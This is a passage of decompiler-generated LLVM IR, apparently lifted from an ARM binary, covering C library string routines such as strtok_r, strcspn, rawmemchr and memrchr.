  %v0_1a36c = phi i32 [ %v1_1a36c, %dec_label_pc_1a368 ], [ %v0_1a384.pre, %entry ]
  %v1_1a378 = urem i32 %v0_1a36c, 4
  %v2_1a378 = icmp eq i32 %v1_1a378, 0
  br i1 %v2_1a378, label %dec_label_pc_1a380, label %dec_label_pc_1a35c

dec_label_pc_1a380:                               ; preds = %dec_label_pc_1a368, %dec_label_pc_1a378, %entry
  %v0_1a3fc22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1a368 ], [ %v0_1a368, %dec_label_pc_1a378 ]
  %v0_1a384 = phi i32 [ %v0_1a384.pre, %entry ], [ %v1_1a36c, %dec_label_pc_1a368 ], [ %v0_1a36c, %dec_label_pc_1a378 ]
  %v4_1a380 = mul nuw nsw i32 %v1_1a354, 256
  %v5_1a380 = or i32 %v4_1a380, %v1_1a354
  %v4_1a388 = mul i32 %v5_1a380, 65536
  %v5_1a388 = or i32 %v4_1a388, %v5_1a380
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1a3fc22, 3
  br i1 %tmp, label %dec_label_pc_1a390, label %dec_label_pc_1a424.preheader

dec_label_pc_1a390:                               ; preds = %dec_label_pc_1a380, %dec_label_pc_1a3fc.backedge
  %v0_1a3ac60 = phi i32 [ %v1_1a3ac, %dec_label_pc_1a3fc.backedge ], [ %v0_1a3fc22, %dec_label_pc_1a380 ]
  %v0_1a3d059 = phi i32 [ %v4_1a390, %dec_label_pc_1a3fc.backedge ], [ %v0_1a384, %dec_label_pc_1a380 ]
  %v1_1a390 = inttoptr i32 %v0_1a3d059 to i32*
  %v2_1a390 = load i32, i32* %v1_1a390, align 4
  %v4_1a390 = add i32 %v0_1a3d059, 4
  %v2_1a394 = xor i32 %v2_1a390, %v5_1a388
  %v2_1a398 = add i32 %v2_1a394, 2130640639
  %v1_1a39c = sub i32 -1, %v2_1a394
  %v2_1a3a0 = xor i32 %v2_1a398, %v1_1a39c
  %v2_1a3a4 = and i32 %v2_1a3a0, -2130640640
  %v2_1a3a8 = icmp eq i32 %v2_1a3a4, 0
  %v1_1a3ac = add i32 %v0_1a3ac60, -4
  br i1 %v2_1a3a8, label %dec_label_pc_1a3fc.backedge, label %dec_label_pc_1a3b4

dec_label_pc_1a3fc.backedge:                      ; preds = %dec_label_pc_1a390, %dec_label_pc_1a3ec
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1a3ac, 3
  br i1 %tmp73, label %dec_label_pc_1a390, label %dec_label_pc_1a424.preheader

dec_label_pc_1a3b4:                               ; preds = %dec_label_pc_1a390
  %v2_1a3b4 = inttoptr i32 %v0_1a3d059 to i8*
  %v3_1a3b4 = load i8, i8* %v2_1a3b4, align 1
  %v4_1a3b4 = zext i8 %v3_1a3b4 to i32
  %v9_1a3bc = icmp eq i32 %v4_1a3b4, %v1_1a354
  %v1_1a3c0 = add i32 %v0_1a3d059, 3
  store i32 %v1_1a3c0, i32* @ip, align 4
  br i1 %v9_1a3bc, label %dec_label_pc_1a430, label %dec_label_pc_1a3c8

dec_label_pc_1a3c8:                               ; preds = %dec_label_pc_1a3b4
  %v1_1a3c8 = add i32 %v0_1a3d059, 1
  %v2_1a3c8 = inttoptr i32 %v1_1a3c8 to i8*
  %v3_1a3c8 = load i8, i8* %v2_1a3c8, align 1
  %v4_1a3c8 = zext i8 %v3_1a3c8 to i32
  %v9_1a3cc = icmp eq i32 %v4_1a3c8, %v1_1a354
  br i1 %v9_1a3cc, label %bb, label %dec_label_pc_1a3dc

bb:                                               ; preds = %dec_label_pc_1a3c8
  br label %dec_label_pc_1a430

dec_label_pc_1a3dc:                               ; preds = %dec_label_pc_1a3c8
  %v1_1a3dc = add i32 %v0_1a3d059, 2
  %v2_1a3dc = inttoptr i32 %v1_1a3dc to i8*
  %v3_1a3dc = load i8, i8* %v2_1a3dc, align 1
  %v4_1a3dc = zext i8 %v3_1a3dc to i32
  %v9_1a3e0 = icmp eq i32 %v4_1a3dc, %v1_1a354
  br i1 %v9_1a3e0, label %dec_label_pc_1a430, label %dec_label_pc_1a3ec

dec_label_pc_1a3ec:                               ; preds = %dec_label_pc_1a3dc
  %v2_1a3ec = inttoptr i32 %v1_1a3c0 to i8*
  %v3_1a3ec = load i8, i8* %v2_1a3ec, align 1
  %v4_1a3ec = zext i8 %v3_1a3ec to i32
  %v9_1a3f0 = icmp eq i32 %v4_1a3ec, %v1_1a354
  br i1 %v9_1a3f0, label %bb36, label %dec_label_pc_1a3fc.backedge

bb36:                                             ; preds = %dec_label_pc_1a3ec
  br label %dec_label_pc_1a430

dec_label_pc_1a424.preheader:                     ; preds = %dec_label_pc_1a3fc.backedge, %dec_label_pc_1a380
  %v0_1a3d0.lcssa = phi i32 [ %v0_1a384, %dec_label_pc_1a380 ], [ %v4_1a390, %dec_label_pc_1a3fc.backedge ]
  %v0_1a3ac.lcssa = phi i32 [ %v0_1a3fc22, %dec_label_pc_1a380 ], [ %v1_1a3ac, %dec_label_pc_1a3fc.backedge ]
  %v2_1a4247 = icmp eq i32 %v0_1a3ac.lcssa, 0
  br i1 %v2_1a4247, label %dec_label_pc_1a42c, label %dec_label_pc_1a414

dec_label_pc_1a414:                               ; preds = %dec_label_pc_1a420, %dec_label_pc_1a424.preheader
  %v0_1a424.in = phi i32 [ %v0_1a424, %dec_label_pc_1a420 ], [ %v0_1a3ac.lcssa, %dec_label_pc_1a424.preheader ]
  %v0_1a420 = phi i32 [ %v1_1a420, %dec_label_pc_1a420 ], [ %v0_1a3d0.lcssa, %dec_label_pc_1a424.preheader ]
  %v0_1a424 = add i32 %v0_1a424.in, -1
  %v1_1a414 = inttoptr i32 %v0_1a420 to i8*
  %v2_1a414 = load i8, i8* %v1_1a414, align 1
  %v3_1a414 = zext i8 %v2_1a414 to i32
  %v9_1a418 = icmp eq i32 %v3_1a414, %v1_1a354
  br i1 %v9_1a418, label %dec_label_pc_1a430, label %dec_label_pc_1a420

dec_label_pc_1a420:                               ; preds = %dec_label_pc_1a414
  %v1_1a420 = add i32 %v0_1a420, 1
  %v2_1a424 = icmp eq i32 %v0_1a424, 0
  br i1 %v2_1a424, label %dec_label_pc_1a42c, label %dec_label_pc_1a414

dec_label_pc_1a42c:                               ; preds = %dec_label_pc_1a420, %dec_label_pc_1a424.preheader
  br label %dec_label_pc_1a430

dec_label_pc_1a430:                               ; preds = %dec_label_pc_1a35c, %dec_label_pc_1a3dc, %dec_label_pc_1a3b4, %dec_label_pc_1a414, %bb36, %bb, %dec_label_pc_1a42c
  %v1_1a434 = phi i32 [ 0, %dec_label_pc_1a42c ], [ %v1_1a3c8, %bb ], [ %v1_1a3c0, %bb36 ], [ %v0_1a420, %dec_label_pc_1a414 ], [ %v1_1a3dc, %dec_label_pc_1a3dc ], [ %v0_1a3d059, %dec_label_pc_1a3b4 ], [ %v0_1a36c, %dec_label_pc_1a35c ]
  ret i32 %v1_1a434

; uselistorder directives
  uselistorder i32 %v1_1a3ac, { 1, 0, 2 }
  uselistorder i32 %v0_1a3d059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_1a380, { 1, 0 }
  uselistorder i32 %v0_1a3fc22, { 1, 2, 0 }
  uselistorder i32 %v0_1a36c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1a384.pre, { 1, 0 }
  uselistorder i32 %v1_1a354, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_1a430, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_1a3fc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1a390, { 1, 0 }
  uselistorder label %dec_label_pc_1a380, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a378, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a440 = load i32, i32* @r4, align 4
  store i32 %v3_1a440, i32* %stack_var_-16, align 4
  %v0_1a444 = load i32, i32* @r0, align 4
  store i32 %v0_1a444, i32* %r4.global-to-local, align 4
  %v2_1a444 = icmp eq i32 %v0_1a444, 0
  %v1_1a448 = load i32, i32* @r2, align 4
  br i1 %v2_1a444, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_1a448 = inttoptr i32 %v1_1a448 to i32*
  %v3_1a448 = load i32, i32* %v2_1a448, align 4
  store i32 %v3_1a448, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1a44c = phi i32 [ %v3_1a448, %bb ], [ %v0_1a444, %entry ]
  store i32 %v0_1a44c, i32* @r0, align 4
  store i32 %v1_1a448, i32* %r5.global-to-local, align 4
  %v0_1a454 = load i32, i32* @r1, align 4
  store i32 %v0_1a454, i32* %r6.global-to-local, align 4
  %v1_1a458 = inttoptr i32 %v0_1a44c to i8*
  %v2_1a458 = call i32 @__GI_strspn(i8* %v1_1a458)
  %v0_1a45c = load i32, i32* %r4.global-to-local, align 4
  %v2_1a45c = add i32 %v0_1a45c, %v2_1a458
  %v3_1a45c = inttoptr i32 %v2_1a45c to i8*
  %v4_1a45c = load i8, i8* %v3_1a45c, align 1
  %v6_1a45c = zext i8 %v4_1a45c to i32
  store i32 %v6_1a45c, i32* %r3.global-to-local, align 4
  store i32 %v2_1a45c, i32* @r4, align 4
  %v2_1a464 = icmp eq i8 %v4_1a45c, 0
  br i1 %v2_1a464, label %bb8, label %dec_label_pc_1a470

bb8:                                              ; preds = %entry._crit_edge
  %v2_1a468 = load i32, i32* %r5.global-to-local, align 4
  %v3_1a468 = inttoptr i32 %v2_1a468 to i32*
  store i32 %v2_1a45c, i32* %v3_1a468, align 4
  br label %dec_label_pc_1a4ac

dec_label_pc_1a470:                               ; preds = %entry._crit_edge
  %v0_1a470 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a478 = call i32 @__GI_strpbrk(i8* %v3_1a45c, i32 %v0_1a470)
  %v3_1a47c = icmp eq i32 %v3_1a478, 0
  br i1 %v3_1a47c, label %dec_label_pc_1a484, label %dec_label_pc_1a49c

dec_label_pc_1a484:                               ; preds = %dec_label_pc_1a470
  %v0_1a488 = load i32, i32* @r4, align 4
  store i32 %v0_1a488, i32* @r0, align 4
  %v2_1a48c = call i32 @rawmemchr(i32 %v0_1a488, i32 0)
  %v0_1a490 = load i32, i32* @r4, align 4
  store i32 %v0_1a490, i32* %r3.global-to-local, align 4
  %v1_1a494 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a494 = inttoptr i32 %v1_1a494 to i32*
  store i32 %v2_1a48c, i32* %v2_1a494, align 4
  br label %dec_label_pc_1a4ac

dec_label_pc_1a49c:                               ; preds = %dec_label_pc_1a470
  %v4_1a478 = inttoptr i32 %v3_1a478 to i8*
  store i8 0, i8* %v4_1a478, align 1
  %v7_1a4a0 = add i32 %v3_1a478, 1
  %v1_1a4a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a4a4 = inttoptr i32 %v1_1a4a4 to i32*
  store i32 %v7_1a4a0, i32* %v2_1a4a4, align 4
  %v0_1a4a8 = load i32, i32* @r4, align 4
  store i32 %v0_1a4a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a4ac

dec_label_pc_1a4ac:                               ; preds = %bb8, %dec_label_pc_1a484, %dec_label_pc_1a49c
  %v0_1a4ac = load i32, i32* %r3.global-to-local, align 4
  %v2_1a4b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a4b0, i32* @r4, align 4
  ret i32 %v0_1a4ac

; uselistorder directives
  uselistorder i32 %v3_1a478, { 0, 2, 1 }
  uselistorder i32 %v0_1a44c, { 1, 0 }
  uselistorder i32 %v0_1a444, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a4ac, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1a4b8 = load i32, i32* @r4, align 4
  store i32 %v3_1a4b8, i32* %stack_var_-16, align 4
  %v6_1a4b8 = load i32, i32* @r5, align 4
  %v9_1a4b8 = load i32, i32* @r6, align 4
  %v0_1a4bc = load i32, i32* @r0, align 4
  %v0_1a4c0 = load i32, i32* @r1, align 4
  store i32 %v0_1a4c0, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_1a4dc8 = inttoptr i32 %v0_1a4bc to i8*
  %v2_1a4dc9 = load i8, i8* %v1_1a4dc8, align 1
  %v2_1a4e011 = icmp eq i8 %v2_1a4dc9, 0
  store i32 %v0_1a4c0, i32* @r0, align 4
  %v1_1a4e812 = add i32 %v0_1a4bc, 1
  store i32 %v1_1a4e812, i32* @r4, align 4
  br i1 %v2_1a4e011, label %dec_label_pc_1a4f0, label %dec_label_pc_1a4cc

dec_label_pc_1a4cc:                               ; preds = %entry, %dec_label_pc_1a4d8
  %v3_1a4dc14.in = phi i8 [ %v2_1a4dc, %dec_label_pc_1a4d8 ], [ %v2_1a4dc9, %entry ]
  %v0_1a4e413 = phi i32 [ %v0_1a4e4.pre, %dec_label_pc_1a4d8 ], [ %v0_1a4c0, %entry ]
  %v3_1a4dc14 = zext i8 %v3_1a4dc14.in to i32
  %v2_1a4cc = call i32 @__GI_strchr(i32 %v0_1a4e413, i32 %v3_1a4dc14)
  %v2_1a4d0 = icmp eq i32 %v2_1a4cc, 0
  %v0_1a4d8 = load i32, i32* @r5, align 4
  br i1 %v2_1a4d0, label %dec_label_pc_1a4d8, label %dec_label_pc_1a4f0

dec_label_pc_1a4d8:                               ; preds = %dec_label_pc_1a4cc
  %v1_1a4d8 = add i32 %v0_1a4d8, 1
  %v0_1a4dc.pre = load i32, i32* @r4, align 4
  %v0_1a4e4.pre = load i32, i32* @r6, align 4
  store i32 %v1_1a4d8, i32* @r5, align 4
  %v1_1a4dc = inttoptr i32 %v0_1a4dc.pre to i8*
  %v2_1a4dc = load i8, i8* %v1_1a4dc, align 1
  %v2_1a4e0 = icmp eq i8 %v2_1a4dc, 0
  store i32 %v0_1a4e4.pre, i32* @r0, align 4
  %v1_1a4e8 = add i32 %v0_1a4dc.pre, 1
  store i32 %v1_1a4e8, i32* @r4, align 4
  br i1 %v2_1a4e0, label %dec_label_pc_1a4f0, label %dec_label_pc_1a4cc

dec_label_pc_1a4f0:                               ; preds = %dec_label_pc_1a4d8, %dec_label_pc_1a4cc, %entry
  %v0_1a4f0 = phi i32 [ 0, %entry ], [ %v0_1a4d8, %dec_label_pc_1a4cc ], [ %v1_1a4d8, %dec_label_pc_1a4d8 ]
  %v2_1a4f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a4f4, i32* @r4, align 4
  store i32 %v6_1a4b8, i32* @r5, align 4
  store i32 %v9_1a4b8, i32* @r6, align 4
  ret i32 %v0_1a4f0

; uselistorder directives
  uselistorder i8 %v2_1a4dc, { 1, 0 }
  uselistorder i32 %v0_1a4e4.pre, { 1, 0 }
  uselistorder i32 %v0_1a4dc.pre, { 1, 0 }
  uselistorder label %dec_label_pc_1a4cc, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1a500 = urem i32 %arg1, 256
  %v0_1a5182 = load i32, i32* @r0, align 4
  %v1_1a5183 = urem i32 %v0_1a5182, 4
  %v2_1a5184 = icmp eq i32 %v1_1a5183, 0
  br i1 %v2_1a5184, label %dec_label_pc_1a520, label %dec_label_pc_1a508

dec_label_pc_1a508:                               ; preds = %entry, %dec_label_pc_1a514
  %v0_1a514 = phi i32 [ %v1_1a514, %dec_label_pc_1a514 ], [ %v0_1a5182, %entry ]
  %v1_1a508 = inttoptr i32 %v0_1a514 to i8*
  %v2_1a508 = load i8, i8* %v1_1a508, align 1
  %v3_1a508 = zext i8 %v2_1a508 to i32
  %v9_1a50c = icmp eq i32 %v3_1a508, %v1_1a500
  br i1 %v9_1a50c, label %dec_label_pc_1a59c, label %dec_label_pc_1a514

dec_label_pc_1a514:                               ; preds = %dec_label_pc_1a508
  %v1_1a514 = add i32 %v0_1a514, 1
  %v1_1a518 = urem i32 %v1_1a514, 4
  %v2_1a518 = icmp eq i32 %v1_1a518, 0
  br i1 %v2_1a518, label %dec_label_pc_1a520, label %dec_label_pc_1a508

dec_label_pc_1a520:                               ; preds = %dec_label_pc_1a514, %entry
  %v0_1a524 = phi i32 [ %v0_1a5182, %entry ], [ %v1_1a514, %dec_label_pc_1a514 ]
  %v4_1a520 = mul nuw nsw i32 %v1_1a500, 256
  %v5_1a520 = or i32 %v4_1a520, %v1_1a500
  %v4_1a528 = mul i32 %v5_1a520, 65536
  %v5_1a528 = or i32 %v4_1a528, %v5_1a520
  br label %dec_label_pc_1a52c

dec_label_pc_1a52c:                               ; preds = %dec_label_pc_1a58c, %dec_label_pc_1a52c, %dec_label_pc_1a520
  %v0_1a570 = phi i32 [ %v0_1a524, %dec_label_pc_1a520 ], [ %v4_1a52c, %dec_label_pc_1a52c ], [ %v4_1a52c, %dec_label_pc_1a58c ]
  %v1_1a52c = inttoptr i32 %v0_1a570 to i32*
  %v2_1a52c = load i32, i32* %v1_1a52c, align 4
  %v4_1a52c = add i32 %v0_1a570, 4
  %v2_1a534 = xor i32 %v2_1a52c, %v5_1a528
  %v2_1a538 = add i32 %v2_1a534, 2130640639
  %v1_1a540 = sub i32 -1, %v2_1a534
  %v2_1a544 = xor i32 %v2_1a538, %v1_1a540
  %v2_1a548 = and i32 %v2_1a544, -2130640640
  %v2_1a54c = icmp eq i32 %v2_1a548, 0
  br i1 %v2_1a54c, label %dec_label_pc_1a52c, label %dec_label_pc_1a554

dec_label_pc_1a554:                               ; preds = %dec_label_pc_1a52c
  %v2_1a554 = inttoptr i32 %v0_1a570 to i8*
  %v3_1a554 = load i8, i8* %v2_1a554, align 1
  %v4_1a554 = zext i8 %v3_1a554 to i32
  %v9_1a55c = icmp eq i32 %v4_1a554, %v1_1a500
  %v1_1a560 = add i32 %v0_1a570, 3
  br i1 %v9_1a55c, label %dec_label_pc_1a59c, label %dec_label_pc_1a568

dec_label_pc_1a568:                               ; preds = %dec_label_pc_1a554
  %v1_1a568 = add i32 %v0_1a570, 1
  %v2_1a568 = inttoptr i32 %v1_1a568 to i8*
  %v3_1a568 = load i8, i8* %v2_1a568, align 1
  %v4_1a568 = zext i8 %v3_1a568 to i32
  %v9_1a56c = icmp eq i32 %v4_1a568, %v1_1a500
  br i1 %v9_1a56c, label %bb, label %dec_label_pc_1a57c

bb:                                               ; preds = %dec_label_pc_1a568
  br label %dec_label_pc_1a59c

dec_label_pc_1a57c:                               ; preds = %dec_label_pc_1a568
  %v1_1a57c = add i32 %v0_1a570, 2
  %v2_1a57c = inttoptr i32 %v1_1a57c to i8*
  %v3_1a57c = load i8, i8* %v2_1a57c, align 1
  %v4_1a57c = zext i8 %v3_1a57c to i32
  %v9_1a580 = icmp eq i32 %v4_1a57c, %v1_1a500
  br i1 %v9_1a580, label %dec_label_pc_1a59c, label %dec_label_pc_1a58c

dec_label_pc_1a58c:                               ; preds = %dec_label_pc_1a57c
  %v2_1a58c = inttoptr i32 %v1_1a560 to i8*
  %v3_1a58c = load i8, i8* %v2_1a58c, align 1
  %v4_1a58c = zext i8 %v3_1a58c to i32
  %v9_1a590 = icmp eq i32 %v4_1a58c, %v1_1a500
  br i1 %v9_1a590, label %dec_label_pc_1a598, label %dec_label_pc_1a52c

dec_label_pc_1a598:                               ; preds = %dec_label_pc_1a58c
  br label %dec_label_pc_1a59c

dec_label_pc_1a59c:                               ; preds = %dec_label_pc_1a508, %dec_label_pc_1a57c, %dec_label_pc_1a554, %bb, %dec_label_pc_1a598
  %v1_1a5a0 = phi i32 [ %v1_1a560, %dec_label_pc_1a598 ], [ %v1_1a568, %bb ], [ %v1_1a57c, %dec_label_pc_1a57c ], [ %v0_1a570, %dec_label_pc_1a554 ], [ %v0_1a514, %dec_label_pc_1a508 ]
  ret i32 %v1_1a5a0

; uselistorder directives
  uselistorder i32 %v4_1a52c, { 1, 0 }
  uselistorder i32 %v0_1a570, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1a520, { 1, 0 }
  uselistorder i32 %v1_1a514, { 1, 0, 2 }
  uselistorder i32 %v0_1a5182, { 2, 1, 0 }
  uselistorder i32 %v1_1a500, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_1a59c, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1a508, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1a5b0 = urem i32 %arg2, 256
  %v2_1a5b4 = add i32 %arg3, %arg1
  %v2_1a5cc4 = icmp eq i32 %arg3, 0
  br i1 %v2_1a5cc4, label %dec_label_pc_1a5dc, label %dec_label_pc_1a5d4

dec_label_pc_1a5bc:                               ; preds = %dec_label_pc_1a5d4
  %v1_1a5bc = add i32 %v0_1a5bc, -1
  %v2_1a5bc = inttoptr i32 %v1_1a5bc to i8*
  %v3_1a5bc = load i8, i8* %v2_1a5bc, align 1
  %v4_1a5bc = zext i8 %v3_1a5bc to i32
  %v9_1a5c0 = icmp eq i32 %v4_1a5bc, %v1_1a5b0
  br i1 %v9_1a5c0, label %dec_label_pc_1a67c, label %dec_label_pc_1a5c8

dec_label_pc_1a5c8:                               ; preds = %dec_label_pc_1a5bc
  %v1_1a5c8 = add i32 %v0_1a5c8, -1
  %v2_1a5cc = icmp eq i32 %v1_1a5c8, 0
  br i1 %v2_1a5cc, label %dec_label_pc_1a5dc, label %dec_label_pc_1a5d4

dec_label_pc_1a5d4:                               ; preds = %entry, %dec_label_pc_1a5c8
  %v0_1a5c8 = phi i32 [ %v1_1a5c8, %dec_label_pc_1a5c8 ], [ %arg3, %entry ]
  %v0_1a5bc = phi i32 [ %v1_1a5bc, %dec_label_pc_1a5c8 ], [ %v2_1a5b4, %entry ]
  %v1_1a5d4 = urem i32 %v0_1a5bc, 4
  %v2_1a5d4 = icmp eq i32 %v1_1a5d4, 0
  br i1 %v2_1a5d4, label %dec_label_pc_1a5dc, label %dec_label_pc_1a5bc

dec_label_pc_1a5dc:                               ; preds = %dec_label_pc_1a5c8, %dec_label_pc_1a5d4, %entry
  %v0_1a66413 = phi i32 [ %v2_1a5b4, %entry ], [ %v1_1a5bc, %dec_label_pc_1a5c8 ], [ %v0_1a5bc, %dec_label_pc_1a5d4 ]
  %v0_1a6509 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1a5c8 ], [ %v0_1a5c8, %dec_label_pc_1a5d4 ]
  %v4_1a5dc = mul nuw nsw i32 %v1_1a5b0, 256
  %v5_1a5dc = or i32 %v4_1a5dc, %v1_1a5b0
  %v4_1a5e0 = mul i32 %v5_1a5dc, 65536
  %v5_1a5e0 = or i32 %v4_1a5e0, %v5_1a5dc
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1a6509, 3
  br i1 %tmp, label %dec_label_pc_1a5e8, label %dec_label_pc_1a670

dec_label_pc_1a5e8:                               ; preds = %dec_label_pc_1a5dc, %dec_label_pc_1a650.backedge
  %v0_1a60440 = phi i32 [ %v1_1a604, %dec_label_pc_1a650.backedge ], [ %v0_1a6509, %dec_label_pc_1a5dc ]
  %v0_1a5e839 = phi i32 [ %v1_1a5e8, %dec_label_pc_1a650.backedge ], [ %v0_1a66413, %dec_label_pc_1a5dc ]
  %v1_1a5e8 = add i32 %v0_1a5e839, -4
  %v2_1a5e8 = inttoptr i32 %v1_1a5e8 to i32*
  %v3_1a5e8 = load i32, i32* %v2_1a5e8, align 4
  %v2_1a5ec = xor i32 %v3_1a5e8, %v5_1a5e0
  %v2_1a5f0 = add i32 %v2_1a5ec, 2130640639
  store i32 %v2_1a5f0, i32* @ip, align 4
  %v1_1a5f4 = sub i32 -1, %v2_1a5ec
  %v2_1a5f8 = xor i32 %v2_1a5f0, %v1_1a5f4
  %v2_1a5fc = and i32 %v2_1a5f8, -2130640640
  %v2_1a600 = icmp eq i32 %v2_1a5fc, 0
  %v1_1a604 = add i32 %v0_1a60440, -4
  br i1 %v2_1a600, label %dec_label_pc_1a650.backedge, label %dec_label_pc_1a60c

dec_label_pc_1a650.backedge:                      ; preds = %dec_label_pc_1a5e8, %dec_label_pc_1a644
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_1a604, 3
  br i1 %tmp46, label %dec_label_pc_1a5e8, label %dec_label_pc_1a670

dec_label_pc_1a60c:                               ; preds = %dec_label_pc_1a5e8
  %v1_1a60c = add i32 %v0_1a5e839, -1
  %v2_1a60c = inttoptr i32 %v1_1a60c to i8*
  %v3_1a60c = load i8, i8* %v2_1a60c, align 1
  %v4_1a60c = zext i8 %v3_1a60c to i32
  %v9_1a610 = icmp eq i32 %v4_1a60c, %v1_1a5b0
  br i1 %v9_1a610, label %dec_label_pc_1a63c, label %dec_label_pc_1a61c

dec_label_pc_1a61c:                               ; preds = %dec_label_pc_1a60c
  %v1_1a61c = add i32 %v0_1a5e839, -2
  %v2_1a61c = inttoptr i32 %v1_1a61c to i8*
  %v3_1a61c = load i8, i8* %v2_1a61c, align 1
  %v4_1a61c = zext i8 %v3_1a61c to i32
  %v9_1a620 = icmp eq i32 %v4_1a61c, %v1_1a5b0
  br i1 %v9_1a620, label %dec_label_pc_1a63c, label %dec_label_pc_1a62c

dec_label_pc_1a62c:                               ; preds = %dec_label_pc_1a61c
  %v1_1a62c = add i32 %v0_1a5e839, -3
  %v2_1a62c = inttoptr i32 %v1_1a62c to i8*
  %v3_1a62c = load i8, i8* %v2_1a62c, align 1
  %v4_1a62c = zext i8 %v3_1a62c to i32
  %v9_1a630 = icmp eq i32 %v4_1a62c, %v1_1a5b0
  br i1 %v9_1a630, label %dec_label_pc_1a63c, label %dec_label_pc_1a644

dec_label_pc_1a63c:                               ; preds = %dec_label_pc_1a62c, %dec_label_pc_1a61c, %dec_label_pc_1a60c
  %v0_1a63c = phi i32 [ %v1_1a62c, %dec_label_pc_1a62c ], [ %v1_1a61c, %dec_label_pc_1a61c ], [ %v1_1a60c, %dec_label_pc_1a60c ]
  br label %dec_label_pc_1a67c

dec_label_pc_1a644:                               ; preds = %dec_label_pc_1a62c
  %v1_1a644 = inttoptr i32 %v1_1a5e8 to i8*
  %v2_1a644 = load i8, i8* %v1_1a644, align 1
  %v3_1a644 = zext i8 %v2_1a644 to i32
  %v9_1a648 = icmp eq i32 %v3_1a644, %v1_1a5b0
  br i1 %v9_1a648, label %dec_label_pc_1a67c, label %dec_label_pc_1a650.backedge

dec_label_pc_1a664:                               ; preds = %dec_label_pc_1a670
  %v1_1a670 = add i32 %v0_1a670, -1
  %v1_1a664 = add i32 %v0_1a664, -1
  %v2_1a664 = inttoptr i32 %v1_1a664 to i8*
  %v3_1a664 = load i8, i8* %v2_1a664, align 1
  %v4_1a664 = zext i8 %v3_1a664 to i32
  %v9_1a668 = icmp eq i32 %v4_1a664, %v1_1a5b0
  br i1 %v9_1a668, label %dec_label_pc_1a67c, label %dec_label_pc_1a670

dec_label_pc_1a670:                               ; preds = %dec_label_pc_1a5dc, %dec_label_pc_1a650.backedge, %dec_label_pc_1a664
  %v0_1a664 = phi i32 [ %v1_1a664, %dec_label_pc_1a664 ], [ %v0_1a66413, %dec_label_pc_1a5dc ], [ %v1_1a5e8, %dec_label_pc_1a650.backedge ]
  %v0_1a670 = phi i32 [ %v1_1a670, %dec_label_pc_1a664 ], [ %v0_1a6509, %dec_label_pc_1a5dc ], [ %v1_1a604, %dec_label_pc_1a650.backedge ]
  %v2_1a670 = icmp eq i32 %v0_1a670, 0
  br i1 %v2_1a670, label %dec_label_pc_1a678, label %dec_label_pc_1a664

dec_label_pc_1a678:                               ; preds = %dec_label_pc_1a670
  br label %dec_label_pc_1a67c

dec_label_pc_1a67c:                               ; preds = %dec_label_pc_1a5bc, %dec_label_pc_1a644, %dec_label_pc_1a664, %dec_label_pc_1a63c, %dec_label_pc_1a678
  %v1_1a680 = phi i32 [ %v0_1a63c, %dec_label_pc_1a63c ], [ 0, %dec_label_pc_1a678 ], [ %v1_1a664, %dec_label_pc_1a664 ], [ %v1_1a5e8, %dec_label_pc_1a644 ], [ %v1_1a5bc, %dec_label_pc_1a5bc ]
  ret i32 %v1_1a680

; uselistorder directives
  uselistorder i32 %v0_1a670, { 1, 0 }
  uselistorder i32 %v1_1a604, { 1, 0, 2 }
  uselistorder i32 %v1_1a5e8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1a5e839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1a5dc, { 1, 0 }
  uselistorder i32 %v0_1a6509, { 1, 2, 0 }
  uselistorder i32 %v0_1a5bc, { 1, 0, 2 }
  uselistorder i32 %v2_1a5b4, { 1, 0 }
  uselistorder i32 %v1_1a5b0, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a67c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1a670, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a650.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1a5e8, { 1, 0 }
  uselistorder label %dec_label_pc_1a5dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a5d4, { 1, 0 }
}

